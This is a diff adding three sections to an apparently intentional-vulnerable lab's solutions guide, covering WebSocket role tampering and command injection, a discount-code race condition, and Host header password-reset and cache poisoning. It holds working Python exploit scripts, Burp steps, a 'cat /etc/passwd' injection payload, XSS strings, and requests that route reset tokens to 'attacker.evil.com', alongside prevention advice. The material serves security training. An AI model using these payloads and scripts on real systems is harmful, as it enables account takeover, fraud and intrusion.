@@ -551,6 +551,672 @@ curl "http://localhost:5000/api/vuln/access-control-advanced/admin?user_id=$admi
 
 ---
 
+## 7. WebSocket Message Manipulation Lab
+
+### Vulnerability Description
+This lab demonstrates real-time WebSocket communication vulnerabilities where attackers can intercept, modify, and inject malicious messages to escalate privileges or execute unauthorized commands.
+
+### Impact
+- Real-time privilege escalation through message tampering
+- Command injection via WebSocket payloads
+- Session hijacking through WebSocket token manipulation
+- Bypass of client-side security controls
+
+### Advanced Solution Steps
+
+#### Step 1: Establish WebSocket Connection and Intercept Traffic
+**Objective:** Connect to the WebSocket server and observe message flow
+
+**Using Browser DevTools:**
+1. Open the WebSocket Manipulation Lab
+2. Open Browser DevTools (F12) → Network tab → WS filter
+3. Click "Connect to Chat Server"
+4. Observe the WebSocket connection at `ws://localhost:5000`
+5. Send a test message and watch the real-time communication
+
+**Using Burp Suite for WebSocket Interception:**
+1. Configure browser to proxy through Burp (127.0.0.1:8080)
+2. In Burp, go to Proxy → Options → WebSocket interception
+3. Enable "Intercept WebSocket messages"
+4. Connect to the lab's WebSocket server
+5. In Burp's WebSocket history, you'll see all messages
+
+**Expected Response:** 
+```json
+{"type":"message","content":"Hello","user":"guest","timestamp":"..."}
+```
+
+#### Step 2: Analyze Message Structure
+**Objective:** Understand the WebSocket message format to identify injection points
+
+**Message Structure Analysis:**
+```json
+{
+  "type": "message",           // Message type: message, status, command
+  "content": "Hello World",    // User input (injectable)
+  "user": "guest",             // User role (tamperable)
+  "timestamp": "2025-10-02T..."
+}
+```
+
+**Burp Suite Analysis:**
+1. In WebSocket history, right-click on a message
+2. Select "Send to Repeater"
+3. In Repeater, modify the JSON payload
+4. Click "Send" to test modified messages
+
+#### Step 3: Privilege Escalation via Role Manipulation
+**Objective:** Escalate from guest to admin by modifying the user role
+
+**Using Browser Console:**
+```javascript
+// Intercept and modify WebSocket send function
+const originalSend = WebSocket.prototype.send;
+WebSocket.prototype.send = function(data) {
+  const message = JSON.parse(data);
+  message.user = "admin";  // Change role to admin
+  console.log("Modified message:", message);
+  originalSend.call(this, JSON.stringify(message));
+};
+
+// Send message with admin privileges
+ws.send(JSON.stringify({
+  type: "message",
+  content: "Admin message",
+  user: "admin",
+  timestamp: new Date().toISOString()
+}));
+```
+
+**Using Burp Suite Repeater:**
+1. Capture a normal message in WebSocket history
+2. Send to Repeater
+3. Modify the JSON:
+```json
+{
+  "type": "message",
+  "content": "Test admin access",
+  "user": "admin",
+  "timestamp": "2025-10-02T18:30:00Z"
+}
+```
+4. Click "Send" and observe the response
+5. **Flag reward:** `{WEBSOCKET_ADMIN_PRIVILEGE_ESCALATION}`
+
+#### Step 4: Command Injection via WebSocket Messages
+**Objective:** Execute system commands by injecting malicious payloads
+
+**Using Burp Suite for Command Injection:**
+1. In Repeater, modify the message type to "command"
+2. Test various command injection payloads:
+
+```json
+{
+  "type": "command",
+  "content": "getUserList",
+  "user": "admin",
+  "timestamp": "2025-10-02T18:30:00Z"
+}
+```
+
+**Advanced command injection:**
+```json
+{
+  "type": "command",
+  "content": "deleteUser; cat /etc/passwd",
+  "user": "admin",
+  "timestamp": "2025-10-02T18:30:00Z"
+}
+```
+
+3. Send the payload and check the response
+4. **Flag reward:** `{WEBSOCKET_COMMAND_INJECTION}`
+
+#### Step 5: Automated WebSocket Exploitation
+**Objective:** Create an automated script for WebSocket exploitation
+
+**Python Script for Automated Exploitation:**
+```python
+import websocket
+import json
+import time
+
+def on_message(ws, message):
+    print(f"Received: {message}")
+    data = json.loads(message)
+    if "admin" in message.lower():
+        print("[+] Admin privilege escalation successful!")
+
+def on_error(ws, error):
+    print(f"Error: {error}")
+
+def on_open(ws):
+    print("[*] WebSocket connection established")
+    
+    # Send privilege escalation payload
+    exploit_payload = {
+        "type": "message",
+        "content": "Privilege escalation test",
+        "user": "admin",
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
+    }
+    ws.send(json.dumps(exploit_payload))
+    
+    # Send command injection payload
+    command_payload = {
+        "type": "command",
+        "content": "getUserList",
+        "user": "admin",
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
+    }
+    ws.send(json.dumps(command_payload))
+
+# Connect to vulnerable WebSocket server
+ws = websocket.WebSocketApp("ws://localhost:5000",
+                          on_message=on_message,
+                          on_error=on_error,
+                          on_open=on_open)
+ws.run_forever()
+```
+
+### Real-World Impact
+- Chat applications with role-based access
+- Real-time trading platforms
+- Collaborative editing tools
+- IoT device control interfaces
+
+### Advanced Prevention Measures
+1. Implement server-side message validation for all WebSocket communications
+2. Use cryptographic signatures to prevent message tampering
+3. Implement role-based access control on the server side
+4. Rate limit WebSocket message frequency
+5. Log and monitor all WebSocket command executions
+6. Use WSS (WebSocket Secure) with proper TLS configuration
+7. Implement WebSocket authentication tokens with short expiration
+
+---
+
+## 8. Race Condition Exploitation Lab
+
+### Vulnerability Description
+Race conditions occur when multiple concurrent requests exploit a time window between checking a condition (Time-of-Check) and using the result (Time-of-Use), allowing attackers to bypass security controls or manipulate resources.
+
+### Impact
+- Multiple use of single-use discount codes
+- Concurrent transaction exploitation
+- Balance manipulation in financial systems
+- Resource exhaustion attacks
+- Inventory bypass in e-commerce
+
+### Advanced Solution Steps
+
+#### Step 1: Identify the Race Condition Window
+**Objective:** Locate the vulnerability in the discount code redemption system
+
+**Manual Testing:**
+1. Open the Race Condition Lab
+2. Note the starting balance: $1000
+3. Use the discount code: `DISCOUNT50`
+4. Observe that the code can only be used once normally
+5. **Vulnerable window:** Between checking if code is used and marking it as used
+
+**Time-of-Check to Time-of-Use (TOCTOU) Flow:**
+```
+1. Server receives redemption request
+2. [CHECK] Is the code already used? → NO
+3. [DELAY - VULNERABLE WINDOW] ← Multiple requests can enter here
+4. [USE] Mark code as used and apply discount
+```
+
+#### Step 2: Exploit with Concurrent Requests Using Burp Suite
+**Objective:** Send multiple simultaneous requests to exploit the race condition
+
+**Using Burp Suite Repeater:**
+1. Capture the discount code redemption request
+2. Send to Repeater
+3. In Repeater, create multiple tabs with the same request (Ctrl+R)
+4. Manually click "Send" on all tabs as fast as possible
+5. Observe that multiple requests succeed
+
+**Using Burp Suite Intruder (Better Method):**
+1. Capture the redemption request: 
+```http
+POST /api/vuln/race-condition HTTP/1.1
+Host: localhost:5000
+Content-Type: application/json
+
+{"code":"DISCOUNT50","accountId":"user123"}
+```
+
+2. Send to Intruder (Ctrl+I)
+3. Clear all payload positions (we don't need variables)
+4. Go to Intruder → Options:
+   - Set "Number of threads" to 20-30 (maximum concurrency)
+   - Disable payload encoding
+   - Enable "Make unmodified baseline request"
+5. Go to Intruder → Payloads:
+   - Payload type: "Null payloads"
+   - Generate: 50 payloads (50 concurrent requests)
+6. Click "Start attack"
+7. **Result:** Multiple requests succeed before the code is marked as used
+
+**Expected Response (Multiple successes):**
+```json
+{
+  "success": true,
+  "message": "Discount applied successfully!",
+  "newBalance": 1050
+}
+```
+
+#### Step 3: Advanced Exploitation with Python Script
+**Objective:** Automate the race condition exploitation with precise timing
+
+**Python Script for Maximum Concurrency:**
+```python
+import requests
+import concurrent.futures
+import time
+
+url = "http://localhost:5000/api/vuln/race-condition"
+payload = {
+    "code": "DISCOUNT50",
+    "accountId": "user123"
+}
+
+def send_request(session, request_id):
+    try:
+        response = session.post(url, json=payload)
+        result = response.json()
+        if result.get("success"):
+            print(f"[+] Request {request_id}: SUCCESS - Balance: {result.get('newBalance')}")
+            return True
+        else:
+            print(f"[-] Request {request_id}: FAILED - {result.get('message')}")
+            return False
+    except Exception as e:
+        print(f"[!] Request {request_id}: ERROR - {e}")
+        return False
+
+def exploit_race_condition(num_requests=50):
+    print(f"[*] Launching {num_requests} concurrent requests...")
+    
+    session = requests.Session()
+    successful_requests = 0
+    
+    # Use ThreadPoolExecutor for maximum concurrency
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
+        # Submit all requests at once
+        futures = [executor.submit(send_request, session, i) for i in range(num_requests)]
+        
+        # Wait for all requests to complete
+        for future in concurrent.futures.as_completed(futures):
+            if future.result():
+                successful_requests += 1
+    
+    print(f"\n[*] Exploitation complete!")
+    print(f"[+] Successful redemptions: {successful_requests}/{num_requests}")
+    print(f"[+] Expected balance increase: ${successful_requests * 50}")
+
+if __name__ == "__main__":
+    exploit_race_condition(50)
+```
+
+**Expected Output:**
+```
+[*] Launching 50 concurrent requests...
+[+] Request 1: SUCCESS - Balance: 1050
+[+] Request 2: SUCCESS - Balance: 1100
+[+] Request 3: SUCCESS - Balance: 1150
+...
+[+] Request 15: SUCCESS - Balance: 1750
+[-] Request 16: FAILED - Code already used
+...
+[*] Exploitation complete!
+[+] Successful redemptions: 15/50
+[+] Expected balance increase: $750
+```
+
+#### Step 4: Balance Manipulation Verification
+**Objective:** Verify the exploitation by checking the final balance
+
+1. Check the final balance in the lab interface
+2. Verify that you've applied the discount multiple times
+3. **Flag reward:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`
+
+**Burp Suite Verification:**
+```http
+GET /api/vuln/race-condition/balance?accountId=user123 HTTP/1.1
+Host: localhost:5000
+```
+
+**Expected Response:**
+```json
+{
+  "balance": 1750,
+  "appliedDiscounts": 15,
+  "message": "Race condition successfully exploited"
+}
+```
+
+#### Step 5: Advanced Race Condition Techniques
+
+**Distributed Race Condition Attack:**
+```python
+# Use multiple IP addresses or machines for harder detection
+import requests
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
+
+def create_session_with_retry():
+    session = requests.Session()
+    retry = Retry(total=5, backoff_factor=0.1)
+    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
+    session.mount('http://', adapter)
+    return session
+```
+
+**Timing Analysis:**
+```python
+import time
+
+def measure_vulnerability_window():
+    times = []
+    for i in range(10):
+        start = time.time()
+        response = requests.post(url, json=payload)
+        end = time.time()
+        times.append(end - start)
+    
+    avg_time = sum(times) / len(times)
+    print(f"[*] Average response time: {avg_time:.4f}s")
+    print(f"[*] Vulnerable window estimate: {avg_time * 1000:.2f}ms")
+```
+
+### Real-World Scenarios
+- E-commerce promotional code exploitation
+- Banking transaction manipulation
+- Cryptocurrency double-spending
+- Limited inventory item purchases
+- Vote manipulation in voting systems
+
+### Advanced Prevention Measures
+1. Implement distributed locking mechanisms (Redis, etcd)
+2. Use database transactions with proper isolation levels (SERIALIZABLE)
+3. Implement idempotency keys for all state-changing operations
+4. Use optimistic locking with version numbers
+5. Rate limit requests per user/IP
+6. Implement request deduplication at the API gateway
+7. Use message queues for sequential processing of critical operations
+8. Monitor for unusual concurrent request patterns
+
+---
+
+## 9. HTTP Host Header Injection Lab
+
+### Vulnerability Description
+HTTP Host header injection vulnerabilities occur when applications trust the Host header for generating URLs, redirects, or password reset links, allowing attackers to manipulate these values for phishing, cache poisoning, or authentication bypass.
+
+### Impact
+- Password reset poisoning (credential theft)
+- Web cache poisoning (widespread XSS)
+- Session hijacking via crafted URLs
+- SSR (Server-Side Request Forgery) attacks
+- Authentication bypass in multi-tenant applications
+
+### Advanced Solution Steps
+
+#### Step 1: Understand the Vulnerable Password Reset Flow
+**Objective:** Identify how the application uses the Host header
+
+**Normal Password Reset Flow:**
+1. User requests password reset
+2. Application generates reset link: `http://[HOST_HEADER]/reset?token=abc123`
+3. Link sent via email
+4. User clicks link and resets password
+
+**Vulnerable Point:** The application trusts the Host header to build the reset URL
+
+#### Step 2: Basic Host Header Manipulation with Burp Suite
+**Objective:** Inject a malicious host to capture the password reset token
+
+**Using Burp Suite Interceptor:**
+1. Open the HTTP Host Header Injection Lab
+2. Enter an email: `victim@bank.com`
+3. Click "Request Password Reset"
+4. **Intercept the request in Burp Suite:**
+
+**Original Request:**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: localhost:5000
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+5. **Modify the Host header:**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: attacker.evil.com
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+6. Forward the request
+7. **Check the email preview** in the lab interface
+
+**Poisoned Email Content:**
+```
+Subject: Password Reset Request
+
+Click here to reset your password:
+http://attacker.evil.com/reset?token=a1b2c3d4e5f6
+
+This link will expire in 1 hour.
+```
+
+**Result:** When the victim clicks the link, their reset token is sent to `attacker.evil.com`!
+
+#### Step 3: Advanced Host Header Injection Techniques
+
+**Technique 1: X-Forwarded-Host Header Injection**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: localhost:5000
+X-Forwarded-Host: attacker.evil.com
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+**Technique 2: Multiple Host Headers**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: localhost:5000
+Host: attacker.evil.com
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+**Technique 3: Host Header with Port Injection**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: localhost:5000@attacker.evil.com
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+**Technique 4: Absolute URI in Request Line**
+```http
+POST http://attacker.evil.com/api/vuln/host-header-injection HTTP/1.1
+Host: localhost:5000
+Content-Type: application/json
+
+{"email":"victim@bank.com"}
+```
+
+#### Step 4: Web Cache Poisoning via Host Header
+**Objective:** Poison the cache to affect all users
+
+**Using Burp Suite for Cache Poisoning:**
+
+1. **Identify cacheable endpoints:**
+```http
+GET /api/vuln/host-header-injection/info HTTP/1.1
+Host: attacker.evil.com
+```
+
+2. **Inject malicious Host header:**
+```http
+GET /api/vuln/host-header-injection/info HTTP/1.1
+Host: attacker.evil.com"><script>alert('XSS')</script><"
+Cache-Control: no-cache
+```
+
+3. **Check response headers:**
+```http
+HTTP/1.1 200 OK
+Cache-Control: public, max-age=3600
+X-Cache: MISS
+```
+
+4. **Send request again to populate cache:**
+```http
+X-Cache: HIT
+```
+
+5. **All subsequent users receive the poisoned response**
+
+**Burp Suite Intruder for Cache Poisoning:**
+1. Send request to Intruder
+2. Set payload position on Host header:
+```http
+Host: §attacker.evil.com§
+```
+3. Payloads:
+   - `attacker.evil.com`
+   - `evil.com"><script>alert(1)</script>`
+   - `localhost:5000@attacker.evil.com`
+4. Monitor for successful cache poisoning
+
+#### Step 5: Automated Exploitation Script
+**Objective:** Automate the password reset poisoning attack
+
+**Python Script for Host Header Injection:**
+```python
+import requests
+import time
+
+def exploit_host_header_injection(target_email, evil_host):
+    url = "http://localhost:5000/api/vuln/host-header-injection"
+    
+    headers = {
+        "Host": evil_host,
+        "Content-Type": "application/json"
+    }
+    
+    payload = {
+        "email": target_email
+    }
+    
+    print(f"[*] Sending poisoned password reset request...")
+    print(f"[*] Target email: {target_email}")
+    print(f"[*] Malicious host: {evil_host}")
+    
+    response = requests.post(url, json=payload, headers=headers)
+    
+    if response.status_code == 200:
+        result = response.json()
+        print(f"[+] Success! Reset link poisoned:")
+        print(f"[+] {result.get('resetLink')}")
+        
+        if evil_host in result.get('resetLink', ''):
+            print(f"[+] Host header injection successful!")
+            print(f"[+] Flag: {result.get('flag')}")
+            return True
+    
+    print(f"[-] Exploitation failed")
+    return False
+
+def test_various_injection_methods(target_email):
+    test_cases = [
+        ("attacker.evil.com", "Basic Host header replacement"),
+        ("localhost:5000@attacker.evil.com", "Port-based injection"),
+        ("evil.com:80#@localhost:5000", "Fragment injection"),
+        ("evil.com%23@localhost:5000", "URL-encoded injection"),
+    ]
+    
+    for malicious_host, description in test_cases:
+        print(f"\n[*] Testing: {description}")
+        exploit_host_header_injection(target_email, malicious_host)
+        time.sleep(1)
+
+if __name__ == "__main__":
+    test_various_injection_methods("victim@bank.com")
+```
+
+#### Step 6: Capture the Flag
+**Objective:** Complete the exploitation and retrieve the flag
+
+1. Successfully poison the password reset link
+2. Verify the email preview shows your malicious domain
+3. **Flag reward:** `{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}`
+
+**Burp Suite Verification:**
+```http
+POST /api/vuln/host-header-injection HTTP/1.1
+Host: hacker.evil.com
+Content-Type: application/json
+
+{"email":"admin@bank.com"}
+```
+
+**Expected Response:**
+```json
+{
+  "success": true,
+  "message": "Password reset email sent",
+  "resetLink": "http://hacker.evil.com/reset?token=xyz789",
+  "flag": "{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}"
+}
+```
+
+### Real-World Attack Scenarios
+
+**Scenario 1: Credential Harvesting**
+1. Attacker sends poisoned reset request with Host: attacker.com
+2. Victim receives email with link to attacker.com
+3. Victim clicks link, token sent to attacker's server
+4. Attacker uses token to reset victim's password
+
+**Scenario 2: Mass Cache Poisoning**
+1. Attacker poisons CDN cache with malicious Host header
+2. All users receive cached response with XSS payload
+3. Widespread account compromise
+
+**Scenario 3: Multi-Tenant Bypass**
+1. SaaS application uses Host header for tenant identification
+2. Attacker manipulates Host header to access other tenants
+3. Cross-tenant data exposure
+
+### Advanced Prevention Measures
+1. Never use Host header for security-sensitive operations
+2. Use absolute URLs with hardcoded domains
+3. Validate Host header against whitelist
+4. Implement proper virtual host configuration
+5. Use HSTS (HTTP Strict Transport Security)
+6. Configure web servers to reject ambiguous requests
+7. Implement domain pinning for password reset links
+8. Use separate domains for administrative functions
+9. Monitor for unusual Host header values
+10. Implement rate limiting on password reset endpoints
+
+---
+
 ## Advanced Testing Tools and Techniques
 
 ### Automated Testing Tools
